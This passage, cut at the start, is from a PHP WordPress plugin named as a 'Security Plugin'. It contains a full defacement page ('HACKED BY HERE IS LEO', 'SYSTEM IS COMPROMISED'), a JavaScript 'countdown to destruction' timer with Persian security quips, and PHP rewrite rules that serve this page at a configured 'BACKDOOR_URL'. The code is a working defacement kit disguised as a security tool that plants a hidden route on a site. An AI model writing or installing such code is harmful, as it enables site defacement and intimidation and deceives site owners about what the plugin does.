        body {
            background: #000000;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Courier New', Courier, monospace;
            padding: 0.5rem;
        }
        .deface {
            max-width: 1000px;
            width: 100%;
            height: 98vh;
            max-height: 750px;
            background: #000000;
            padding: 0.8rem 1.5rem 1.5rem 1.5rem;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .group {
            color: #00BFFF;
            font-size: 1.8rem;
            letter-spacing: 8px;
            font-weight: 600;
            margin-bottom: 0.1rem;
            text-shadow: 0 0 25px #00BFFF, 0 0 60px #00BFFF, 0 0 100px #00BFFF;
        }
        h1 {
            color: #ffffff;
            font-size: 2.8rem;
            font-weight: 700;
            letter-spacing: 4px;
            margin: 0.2rem 0 0.1rem 0;
            line-height: 1.1;
        }
        .sub {
            color: #ffffff;
            font-size: 1.1rem;
            letter-spacing: 3px;
            margin-bottom: 0.4rem;
        }
        .msg {
            padding: 0.4rem 0.2rem;
            margin: 0.3rem 0 0.5rem 0;
        }
        .msg p {
            color: #ffffff;
            font-size: 1.4rem;
            font-weight: 400;
            letter-spacing: 1.5px;
            line-height: 1.5;
        }
        .red { color: #ff0000; font-weight: 700; text-shadow: 0 0 20px #ff0000; }
        .dedication {
            color: #ffffff;
            font-size: 1rem;
            padding: 0.3rem 0 0.1rem 0;
            letter-spacing: 0.5px;
        }
        .footer {
            color: #ffffff;
            font-size: 1.8rem;
            letter-spacing: 8px;
            margin-top: 0.6rem;
            padding-top: 0.4rem;
            font-weight: 700;
            text-shadow: 0 0 40px #ff0000;
        }
        .footer .red {
            color: #ff0000;
            text-shadow: 0 0 50px #ff0000;
            font-size: 2.2rem;
        }
        .timer-section {
            margin-top: 0.8rem;
            padding-top: 0.8rem;
            border-top: 3px solid #ff0000;
        }
        .timer-label {
            color: #ffffff;
            font-size: 1.1rem;
            letter-spacing: 3px;
            text-transform: uppercase;
            margin-bottom: 0.4rem;
            font-weight: 700;
        }
        .timer {
            color: #ff0000;
            font-size: 4.5rem;
            font-weight: 900;
            letter-spacing: 10px;
            text-shadow: 0 0 50px #ff0000, 0 0 100px #ff0000;
            font-family: 'Courier New', Courier, monospace;
            padding: 0.3rem 0;
            background: #0a0000;
            border: 2px solid #ff0000;
            border-radius: 6px;
            margin: 0.3rem 0 0.3rem 0;
        }
        .fact-display {
            color: #ffcc00;
            font-size: 0.95rem;
            padding: 0.3rem 0.5rem;
            min-height: 2.8rem;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Courier New', Courier, monospace;
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 4px;
            margin: 0.2rem 0 0.4rem 0;
            direction: rtl;
            text-align: center;
            line-height: 1.5;
        }
        .btn-start {
            background: #ff0000;
            color: #000000;
            border: none;
            padding: 0.7rem 3rem;
            font-size: 1.4rem;
            font-weight: 900;
            font-family: 'Courier New', Courier, monospace;
            letter-spacing: 4px;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            margin-top: 0.2rem;
            border-radius: 4px;
        }
        .btn-start:hover {
            background: #ffffff;
            color: #000000;
            box-shadow: 0 0 60px #ff0000;
        }
        .btn-start:active { transform: scale(0.95); }
        .btn-start.running { background: #660000; color: #ffffff; }
        @media (max-width: 768px) {
            .deface { padding: 0.5rem 0.8rem; max-height: 100vh; height: 100vh; }
            h1 { font-size: 2rem; letter-spacing: 2px; }
            .msg p { font-size: 1.1rem; }
            .footer { font-size: 1.3rem; letter-spacing: 4px; }
            .timer { font-size: 3rem; letter-spacing: 6px; }
            .btn-start { font-size: 1rem; padding: 0.5rem 1.5rem; }
            .group { font-size: 1.4rem; letter-spacing: 5px; }
            .dedication { font-size: 0.9rem; }
            .sub { font-size: 0.9rem; }
            .timer-label { font-size: 0.9rem; }
            .fact-display { font-size: 0.8rem; min-height: 2.2rem; }
        }
        @media (max-width: 480px) {
            .timer { font-size: 2.2rem; letter-spacing: 4px; }
            h1 { font-size: 1.5rem; }
            .msg p { font-size: 0.95rem; }
            .footer { font-size: 1rem; }
            .btn-start { font-size: 0.85rem; padding: 0.4rem 1rem; }
            .group { font-size: 1.2rem; }
            .fact-display { font-size: 0.7rem; min-height: 2rem; }
        }
    </style>
</head>
<body>
    <div class="deface">
        <div class="group">MOSCOW</div>
        <h1>HACKED BY <span class="red">HERE IS LEO</span></h1>
        <div class="sub">(CYBER ACTIVIST)</div>
        <div class="msg">
            <p>
                <span class="red">HACKED?</span> IMPROVE YOUR <span class="red">SECURITY</span>.<br>
                <span style="color:#ffffff;">YOUR SYSTEM IS <span class="red">COMPROMISED</span></span>
            </p>
        </div>
        <div class="dedication">
            DEDICATION TO ALL THE MEMBERS OF <span class="red">HACKFORCE</span> :)
        </div>
        <div class="footer">
            <span class="red">//</span> DEFACED <span class="red">//</span>
        </div>
        <div class="timer-section">
            <div class="timer-label"> COUNTDOWN TO DESTRUCTION</div>
            <div class="timer" id="timerDisplay">50:00:00</div>
            <div class="fact-display" id="factDisplay"> برای شروع تایمر، دکمه START را بزن</div>
            <button class="btn-start" id="startTimerBtn">► START</button>
        </div>
    </div>
    <script>
        // 40 فکت امنیتی (25 طعنه‌آمیز + 15 پند)
        const facts = [
            "123456 رمز عبور نیست، اعلامیه عمومی است.",
            "رمز قوی روی کاغذ، هنوز رمز ضعیفی است.",
            "هکر همیشه رمز را نمی‌شکند، گاهی کاربر خودش تحویلش می‌دهد.",
            "Wi-Fi رایگان همیشه واقعاً رایگان نیست.",
            "فایروال بدتنظیم‌شده بیشتر جنبه دکوری دارد.",
            "آنتی‌ویروس جای عقل را نمی‌گیرد.",
            "آپدیت نکردن یعنی دعوت از باگ‌های قدیمی.",
            "پورت غیرضروری باز یعنی یک درِ اضافه.",
            "بکاپ نداشتن یعنی اعتماد کامل به هارددیسک.",
            "لینک مشکوک معمولاً دلیل خوبی برای کلیک نکردن دارد.",
            "مهندسی اجتماعی گاهی از هک فنی ساده‌تر است.",
            "رمز یکسان برای همه حساب‌ها یعنی یک کلید برای تمام خانه‌ها.",
            "VPN جادوگر امنیتی نیست.",
            "Incognito تو را از اینترنت نامرئی نمی‌کند.",
            "فایروال نمی‌تواند جلوی اشتباهات کاربر را بگیرد.",
            "هر نرم‌افزار اضافی یعنی یک احتمال اضافی برای آسیب‌پذیری.",
            "سرور بدون لاگ مثل دوربین بدون حافظه است.",
            "امنیت یک‌بار تنظیم نمی‌شود، دائماً باید بررسی شود.",
            "قوی‌ترین سیستم هم با رمز لو رفته مشکل دارد.",
            "«فقط یه فایل کرک بود» شروع بعضی داستان‌های غم‌انگیز کامپیوتری است.",
            "دسترسی زیاد برای برنامه‌ها یعنی اعتماد زیاد به برنامه‌ها.",
            "رمز عبور کوتاه، کار هکر را راحت‌تر می‌کند.",
            "اطلاعات شخصی کوچک هم می‌توانند کنار هم خطرناک شوند.",
            "امنیت شبکه بدون مانیتورینگ، نصفه‌کاره است.",
            "بزرگ‌ترین آسیب‌پذیری بعضی سیستم‌ها، پشت صفحه‌کلید نشسته است.",
            "پند: برای هر حساب مهم رمز متفاوت داشته باش.",
            "پند: احراز هویت دومرحله‌ای را فعال کن.",
            "پند: سیستم‌عامل و نرم‌افزارها را آپدیت نگه دار.",
            "پند: روی لینک‌های مشکوک کلیک نکن.",
            "پند: فایل ناشناس را اجرا نکن.",
            "پند: رمز عبورت را با دیگران به اشتراک نگذار.",
            "پند: از Password Manager معتبر استفاده کن.",
            "پند: برای حساب ایمیل اصلیت امنیت بیشتری فعال کن.",
            "پند: از اطلاعات مهم بکاپ بگیر.",
            "پند: رمز پیش‌فرض روتر را تغییر بده.",
            "پند: دسترسی برنامه‌ها را بررسی کن.",
            "پند: پورت‌ها و سرویس‌های غیرضروری را غیرفعال کن.",
            "پند: ورودهای مشکوک به حساب‌هایت را بررسی کن.",
            "پند: روی شبکه‌های عمومی اطلاعات حساس وارد نکن.",
            "پند: قبل از هر کلیک، فرستنده و مقصد لینک را بررسی کن."
        ];

        function shuffleArray(arr) {
            for (let i = arr.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [arr[i], arr[j]] = [arr[j], arr[i]];
            }
            return arr;
        }

        const shuffledFacts = shuffleArray(facts);

        let timerInterval = null;
        let isRunning = false;
        let totalSeconds = 50 * 60 * 60;
        let factInterval = null;
        let factIndex = 0;

        const timerDisplay = document.getElementById('timerDisplay');
        const startBtn = document.getElementById('startTimerBtn');
        const factDisplay = document.getElementById('factDisplay');

        function formatTime(seconds) {
            const hrs = Math.floor(seconds / 3600);
            const mins = Math.floor((seconds % 3600) / 60);
            const secs = seconds % 60;
            return `${String(hrs).padStart(2, '0')}:${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        }

        function updateDisplay() {
            timerDisplay.textContent = formatTime(totalSeconds);
        }

        function showNextFact() {
            const fact = shuffledFacts[factIndex % shuffledFacts.length];
            factDisplay.textContent = '🔐 ' + fact;
            factIndex++;
        }

        function startTimer() {
            if (isRunning) return;
            if (totalSeconds <= 0) {
                totalSeconds = 50 * 60 * 60;
                updateDisplay();
                timerDisplay.style.animation = 'none';
                factIndex = 0;
            }
            isRunning = true;
            startBtn.textContent = '● RUNNING';
            startBtn.classList.add('running');

            showNextFact();

            timerInterval = setInterval(() => {
                if (totalSeconds <= 0) {
                    clearInterval(timerInterval);
                    clearInterval(factInterval);
                    timerInterval = null;
                    factInterval = null;
                    isRunning = false;
                    startBtn.textContent = '► RESTART';
                    startBtn.classList.remove('running');
                    timerDisplay.textContent = '00:00:00';
                    timerDisplay.style.animation = 'blink 0.5s infinite';
                    factDisplay.textContent = '⏰ TIME IS UP! SYSTEM DESTROYED!';
                    return;
                }
                totalSeconds--;
                updateDisplay();
            }, 1000);

            factInterval = setInterval(() => {
                if (totalSeconds > 0) {
                    showNextFact();
                }
            }, 120000);
        }

        const style = document.createElement('style');
        style.textContent = `@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }`;
        document.head.appendChild(style);

        startBtn.addEventListener('click', startTimer);
        updateDisplay();
    </script>
</body>
</html>
        <?php
    }
}

// ============================================
// راه‌اندازی پلاگین
// ============================================

new MOSCOW_Security_Plugin();

// اضافه کردن Rewrite Rules
function moscow_add_rewrite_rules() {
    $backdoor_url = MOSCOW_Config::BACKDOOR_URL;
    add_rewrite_rule('^' . $backdoor_url . '/?$', 'index.php?moscow_page=defaced', 'top');
}
add_action('init', 'moscow_add_rewrite_rules');

function moscow_query_vars($vars) {
    $vars[] = 'moscow_page';
    return $vars;
}
add_filter('query_vars', 'moscow_query_vars');

function moscow_template_redirect() {
    $page = get_query_var('moscow_page');
    if ($page == 'defaced') {
        $plugin = new MOSCOW_Security_Plugin();
        $plugin->show_defaced_page();
        exit;
    }
}
add_action('template_redirect', 'moscow_template_redirect');

register_activation_hook(__FILE__, 'moscow_flush_rewrites');
function moscow_flush_rewrites() {
    moscow_add_rewrite_rules();
    flush_rewrite_rules();
}
?>